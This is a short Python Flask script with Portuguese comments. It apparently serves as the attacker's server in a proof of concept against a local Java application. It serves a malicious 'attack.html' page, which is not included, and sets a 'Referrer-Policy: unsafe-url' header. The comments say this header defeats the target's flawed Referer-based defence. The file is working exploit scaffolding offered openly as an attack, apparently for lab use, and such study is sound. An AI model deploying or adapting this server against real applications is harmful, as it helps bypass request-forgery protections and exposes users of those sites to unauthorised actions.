from flask import Flask, render_template, make_response

# Criamos uma aplicação Flask simples
app = Flask(__name__)

# Esta é a nossa única rota, a página inicial do atacante
@app.route('/')
def exploit():
    # Renderiza o nosso template HTML malicioso
    html = render_template('attack.html')
    response = make_response(html)
    
    # Adiciona o cabeçalho CRUCIAL que força o navegador a enviar a URL completa no Referer,
    # permitindo contornar a defesa falha da aplicação Java.
    response.headers['Referrer-Policy'] = 'unsafe-url'
    
    print("[Exploit Server] Servindo página de ataque em http://localhost:8000")
    return response

if __name__ == '__main__':
    # Roda na porta 8000 para não conflitar com o servidor Java (que usa 8080)
    app.run(port=8000, debug=True)